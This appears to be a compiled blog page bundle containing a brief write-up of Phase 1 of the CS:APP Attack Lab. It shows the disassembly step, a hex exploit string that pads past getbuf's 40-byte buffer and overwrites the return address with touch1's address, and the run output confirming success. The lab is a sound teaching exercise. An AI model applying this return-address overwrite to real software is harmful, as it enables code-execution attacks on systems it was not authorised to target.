import{_ as e,o as a,c as t,e as s}from"./app-CoV9NwP4.js";const n={},i=s(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> ctarget <span class="token operator">&gt;</span> ctarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-ctarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-ctarget-asm"><span>Read File <code>ctarget.asm</code></span></a></h6><div class="language-assembly line-numbers-mode" data-ext="assembly" data-title="assembly"><pre class="language-assembly"><code>...
0000000000401b28 &lt;getbuf&gt;:
  401b28:	48 83 ec 28          	sub    $0x28,%rsp
...
0000000000401b3e &lt;touch1&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-1-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-1-txt"><span>Write File <code>phase-1.txt</code></span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
3e 1b 40 00 00 00 00 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1"><span>Run</span></a></h6><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-1.txt <span class="token operator">&gt;</span> phase-1.in
./ctarget <span class="token parameter variable">-i</span> phase-1.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output"><span>Terminal Output</span></a></h6><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),r=[i];function l(d,c){return a(),t("div",null,r)}const p=e(n,[["render",l],["__file","2022-04-23-phase-1.html.vue"]]),m=JSON.parse('{"path":"/2022/course-work/csapp/attack-lab/2022-04-23-phase-1.html","title":"Attack Lab: Phase 1","lang":"en-US","frontmatter":{"date":"2022-04-23T00:00:00.000Z","isOriginal":true,"category":["Course Work"],"tag":["Attack Lab","Computer Organization and Architecture"],"title":"Attack Lab: Phase 1","description":"Run Read File ctarget.asm Write File phase-1.txt Run Terminal Output","head":[["meta",{"property":"og:url","content":"https://blog.liblaf.me/2022/course-work/csapp/attack-lab/2022-04-23-phase-1.html"}],["meta",{"property":"og:site_name","content":"Blog"}],["meta",{"property":"og:title","content":"Attack Lab: Phase 1"}],["meta",{"property":"og:description","content":"Run Read File ctarget.asm Write File phase-1.txt Run Terminal Output"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"en-US"}],["meta",{"property":"og:updated_time","content":"2024-03-03T09:57:39.000Z"}],["meta",{"property":"article:author","content":"liblaf"}],["meta",{"property":"article:tag","content":"Attack Lab"}],["meta",{"property":"article:tag","content":"Computer Organization and Architecture"}],["meta",{"property":"article:published_time","content":"2022-04-23T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-03-03T09:57:39.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Attack Lab: Phase 1\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-04-23T00:00:00.000Z\\",\\"dateModified\\":\\"2024-03-03T09:57:39.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"liblaf\\",\\"url\\":\\"https://liblaf.me\\",\\"email\\":\\"i@liblaf.me\\"}]}"]]},"headers":[],"git":{"createdTime":1677217008000,"updatedTime":1709459859000,"contributors":[{"name":"liblaf","email":"30631553+liblaf@users.noreply.github.com","commits":3}]},"readingTime":{"minutes":0.43,"words":130},"filePathRelative":"2022/course-work/csapp/attack-lab/2022-04-23-phase-1.md","localizedDate":"April 23, 2022","excerpt":"<h6>Run</h6>\\n<div class=\\"language-bash\\" data-ext=\\"sh\\" data-title=\\"sh\\"><pre class=\\"language-bash\\"><code>objdump <span class=\\"token parameter variable\\">--disassemble</span> ctarget <span class=\\"token operator\\">&gt;</span> ctarget.asm\\n</code></pre></div><h6>Read File <code>ctarget.asm</code></h6>\\n<div class=\\"language-assembly\\" data-ext=\\"assembly\\" data-title=\\"assembly\\"><pre class=\\"language-assembly\\"><code>...\\n0000000000401b28 &lt;getbuf&gt;:\\n  401b28:\\t48 83 ec 28          \\tsub    $0x28,%rsp\\n...\\n0000000000401b3e &lt;touch1&gt;:\\n...\\n</code></pre></div>","autoDesc":true}');export{p as comp,m as data};
